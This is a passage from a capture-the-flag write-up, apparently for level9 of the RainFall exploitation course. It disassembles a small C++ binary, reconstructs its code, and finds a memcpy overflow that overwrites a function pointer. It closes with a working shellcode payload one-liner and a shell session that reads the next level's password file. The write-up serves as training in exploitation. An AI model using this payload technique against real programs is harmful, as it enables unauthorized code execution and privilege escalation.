 80486f7:       89 e5                   mov    ebp,esp
 80486f9:       8b 45 08                mov    eax,DWORD PTR [ebp+0x8]
 80486fc:       c7 00 48 88 04 08       mov    DWORD PTR [eax],0x8048848
 8048702:       8b 45 08                mov    eax,DWORD PTR [ebp+0x8]
 8048705:       8b 55 0c                mov    edx,DWORD PTR [ebp+0xc]
 8048708:       89 50 68                mov    DWORD PTR [eax+0x68],edx
 804870b:       5d                      pop    ebp
 804870c:       c3                      ret
 804870d:       90                      nop

0804870e <_ZN1N13setAnnotationEPc>:
 804870e:       55                      push   ebp
 804870f:       89 e5                   mov    ebp,esp
 8048711:       83 ec 18                sub    esp,0x18
 8048714:       8b 45 0c                mov    eax,DWORD PTR [ebp+0xc]
 8048717:       89 04 24                mov    DWORD PTR [esp],eax
 804871a:       e8 01 fe ff ff          call   8048520 <strlen@plt>
 804871f:       8b 55 08                mov    edx,DWORD PTR [ebp+0x8]
 8048722:       83 c2 04                add    edx,0x4
 8048725:       89 44 24 08             mov    DWORD PTR [esp+0x8],eax
 8048729:       8b 45 0c                mov    eax,DWORD PTR [ebp+0xc]
 804872c:       89 44 24 04             mov    DWORD PTR [esp+0x4],eax
 8048730:       89 14 24                mov    DWORD PTR [esp],edx
 8048733:       e8 d8 fd ff ff          call   8048510 <memcpy@plt>
 8048738:       c9                      leave
 8048739:       c3                      ret

0804873a <_ZN1NplERS_>:
 804873a:       55                      push   ebp
 804873b:       89 e5                   mov    ebp,esp
 804873d:       8b 45 08                mov    eax,DWORD PTR [ebp+0x8]
 8048740:       8b 50 68                mov    edx,DWORD PTR [eax+0x68]
 8048743:       8b 45 0c                mov    eax,DWORD PTR [ebp+0xc]
 8048746:       8b 40 68                mov    eax,DWORD PTR [eax+0x68]
 8048749:       01 d0                   add    eax,edx
 804874b:       5d                      pop    ebp
 804874c:       c3                      ret
 804874d:       90                      nop

0804874e <_ZN1NmiERS_>:
 804874e:       55                      push   ebp
 804874f:       89 e5                   mov    ebp,esp
 8048751:       8b 45 08                mov    eax,DWORD PTR [ebp+0x8]
 8048754:       8b 50 68                mov    edx,DWORD PTR [eax+0x68]
 8048757:       8b 45 0c                mov    eax,DWORD PTR [ebp+0xc]
 804875a:       8b 40 68                mov    eax,DWORD PTR [eax+0x68]
 804875d:       89 d1                   mov    ecx,edx
 804875f:       29 c1                   sub    ecx,eax
 8048761:       89 c8                   mov    eax,ecx
 8048763:       5d                      pop    ebp
 8048764:       c3                      ret
 8048765:       90                      nop
 8048766:       90                      nop
 8048767:       90                      nop
 8048768:       90                      nop
 8048769:       90                      nop
 804876a:       90                      nop
 804876b:       90                      nop
 804876c:       90                      nop
 804876d:       90                      nop
 804876e:       90                      nop
 804876f:       90                      nop

```
I saw some strange sections, and like ` <_Z41__static_initialization_and_destruction_0ii>`, and I found out that [this is generated by C++ compilers](https://stackoverflow.com/questions/2434505/g-static-initialization-and-destruction-0int-int-what-is-it) to help with class construction and destruction. 

The asm is hella weird compared to the last 9 levels so here are the bits that I observed.

For functions with weird symbols like `_ZN1NC1Ei`, `_ZN1NplERS_` and whatnot, its obfusticated by the compiler. We can get the actual symbols in GDB by stepping into those functions like so 

![image](https://hackmd.io/_uploads/H1y-SclLp.png)

As we can see, we are in function `_ZN1NC2Ei`, however the compiler says we are in the function name `N::N(int) ()`. Which is a constructor for the N class for CPP programming. Classes in cpp have similar memory layout with C structs ; elements inside the class are close to each other, with some padding.

With that said, here is the pseudocode based on the disassembly

```cpp=
#include <string.h>

class N {
    public :
        int val;
        char *annotation;
    
        // 0804870e 
        void setAnnotation(const char *str)
        {
            memcpy(annotation, str, strlen(str));
        }
    
        // 0804873a 
        int operator+(N arg)
        {
            return (this->val + N.val);
        }
}

int main(int argc, char **argv)
{
    if (argc != 2)	
		std::exit(1);
    
    N *a = new N(5);
    N *b = new N(6);
    
    a->setAnnotation(argv[1]);
    return (*a + *b);
}
```
The programming mistake that had happened there is in the function `setAnnotation`, where the program calls memcpy on an uninitialized array. we can test this by supplying a long argv. As we can see, the program segfaults.
![image](https://hackmd.io/_uploads/rytMF9xIT.png)

It overwrote the function pointer for `operator+` which is obtained by derefrencing the pointer to the N class, which is called at instruction `8048693`. After trail and error, we figured the offset is **109**
![image](https://hackmd.io/_uploads/ByjIXjlLa.png)

I tried using the env method but there is too much calculation involved, so i just hardcoded the addresses to make it jump to the buffer, which will contain another address to make it jump to the shellcode instructions.

![image](https://hackmd.io/_uploads/SJ22KnxUT.png)

As we can see, the start of the buffer is `0x0804a00c` according to memcpy. `0x0804a00c` will contain an address which points to the start of the buffer + 4, which is `0x0804a010`. The program will derefrence `0x0804a00c` to `0x0804a010`, which derefrences again to our shellcode. 

To make the program read `0x0804a00c`, we need to make sure our payload hits the **109** offset

```
./level9 `python -c "print '\x08\x04\xa0\x10'[::-1] + '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80' + 'b' * 83 + '\x08\x04\xa0\x0c'[::-1]"`
```
The password is obtained `f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728`

```
level9@RainFall:~$ ./level9 `python -c "print '\x08\x04\xa0\x10'[::-1] + '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80' + 'b' * 83 + '\x08\x04\xa0\x0c'[::-1]"`
$ whoami
bonus0
$ cat /home/user/bonus0/.pass
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
$
```
